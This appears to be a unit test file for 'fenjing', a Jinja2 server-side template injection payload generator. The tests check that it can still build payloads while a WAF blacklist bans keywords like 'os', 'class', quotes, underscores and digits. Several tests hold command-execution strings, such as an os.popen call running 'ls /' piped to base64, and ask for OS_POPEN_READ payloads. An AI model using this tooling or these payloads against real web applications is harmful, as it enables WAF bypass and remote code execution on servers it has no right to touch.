import sys  # noqa

sys.path.append("..")  # noqa

import unittest
import fenjing


from fenjing.payload_gen import PayloadGenerator, expression_gens
from fenjing import const
import logging

from jinja2 import Template, TemplateError

fenjing.payload_gen.logger.setLevel(logging.ERROR)


def get_payload_gen(blacklist, context):
    def waf_func(x):
        return all(word not in x for word in blacklist)

    return PayloadGenerator(waf_func, context)



class PayloadGenTestsTargetRules(unittest.TestCase):

    def setUp(self):
        super().setUp()
        self.context = {
            "l": 1,
            "e": 3,
            "lo": 10,
            "loo": 100,
            "eoo": 300,
        }
        self.context_payload = "{%set l=1%}{%set e=3%}{%set lo=10%}{%set loo=100%}{%set eoo=300%}"
        self.payload_gen = get_payload_gen([],self.context)

    def target_test(self, target):
        gen_type = target[0]
        for gen_func in expression_gens[gen_type]:
            try:
                target_list = gen_func(self.context, *target[1:])
            except Exception as e:
                raise RuntimeError(f"Generate failed for rule {gen_func.__name__}") from e
            result = self.payload_gen.generate_by_list(target_list)

            if not result:
                continue
            try:
                str_result, _, _ = result
                Template(self.context_payload + f"Hello, {str_result}").render()
            except TemplateError as e:
                raise RuntimeError(f"Render failed for rule {gen_func.__name__}") from e

    def test_targets(self):
        targets = [
            (const.ZERO, ),
            (const.INTEGER, 11),
            (const.INTEGER, 123),
            (const.PLUS, (const.INTEGER, 98), (const.INTEGER, 37)),
            (const.MULTIPLY, (const.INTEGER, 3), (const.INTEGER, 37)),
            (const.MULTIPLY, (const.STRING, "a"), (const.INTEGER, 11)),

            (const.STRING_PERCENT,),
            (const.STRING_LOWERC,),
            (const.STRING_PERCENT_LOWER_C, ),
            (const.STRING_MANY_PERCENT_LOWER_C, 11),
            (const.STRING, "a"),
            (const.STRING, "__class__"),
            (const.STRING, "echo 'cracked\"\\'"),
            (const.STRING, "ls /;"),

            (const.MODULE_OS),
            (const.OS_POPEN_READ, "echo 'cracked\"\\'"),
        ]
        for target in targets:
            logging.info("Testing target: %s", repr(target))
            self.target_test(target)


class PayloadGenTestCaseSimple(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.payload_gen = get_payload_gen(
            [
                "[",
            ],
            {},
        )

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string))

    def test_os_popen_read(self):
        self.assertIsNotNone(
            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
        )


class PayloadGenTestCaseNoNumber(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.payload_gen = get_payload_gen(
            ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
            {
                "l": 1,
                "e": 3,
                "lo": 10,
                "loo": 100,
                "eoo": 300,
            },
        )

    def test_integers(self):
        for num in range(1, 128):
            self.assertIsNotNone(self.payload_gen.generate(const.INTEGER, num))

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string))

    def test_os_popen_read(self):
        self.assertIsNotNone(
            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
        )


class PayloadGenTestCaseHard(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.payload_gen = get_payload_gen(
            [
                "config",
                "self",
                "g",
                "os",
                "class",
                "length",
                "mro",
                "base",
                "lipsum",
                "[",
                '"',
                "'",
                "_",
                ".",
                "+",
                "~",
                "{{",
                "0",
                "1",
                "2",
                "3",
                "4",
                "5",
                "6",
                "7",
                "8",
                "9",
                "０",
                "１",
                "２",
                "３",
                "４",
                "５",
                "６",
                "７",
                "８",
                "９",
            ],
            {
                "l": 1,
                "e": 3,
                "lo": 10,
                "loo": 100,
                "eoo": 300,
            },
        )

    def test_targets(self):
        targets = [
            (const.STRING_PERCENT, ),
            (const.STRING_LOWERC, ),
            (const.INTEGER, 11),
            (const.STRING, "a"),
            (const.STRING_PERCENT_LOWER_C, ),
            (const.STRING_MANY_PERCENT_LOWER_C, 11),
            (const.STRING, "ls /;"),
        ]
        for target in targets:
            result = self.payload_gen.generate(target[0], *target[1:])
            self.assertIsNotNone(result, repr(target))


    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string), string)

    def test_os_popen_read(self):
        self.assertIsNotNone(
            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
        )
